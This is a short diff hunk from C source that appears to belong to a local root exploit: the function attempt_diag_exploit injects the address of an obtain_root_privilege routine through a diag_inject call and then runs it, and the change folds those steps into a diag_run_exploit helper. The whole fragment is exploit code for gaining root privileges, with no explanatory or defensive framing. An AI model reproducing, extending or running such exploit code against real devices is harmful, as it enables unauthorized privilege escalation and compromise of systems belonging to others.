@@ -43,14 +43,8 @@ attempt_diag_exploit(unsigned long int address)
   injection_data.address = address;
   injection_data.value = (uint16_t)&obtain_root_privilege;
 
-  if (!diag_inject(&injection_data, 1)) {
-    return false;
-  }
-
-  run_obtain_root_privilege(NULL);
-
-  injection_data.value = 3;
-  return diag_inject(&injection_data, 1);
+  return diag_run_exploit(&injection_data, 1,
+                          run_obtain_root_privilege, NULL);
 }
 
 static bool
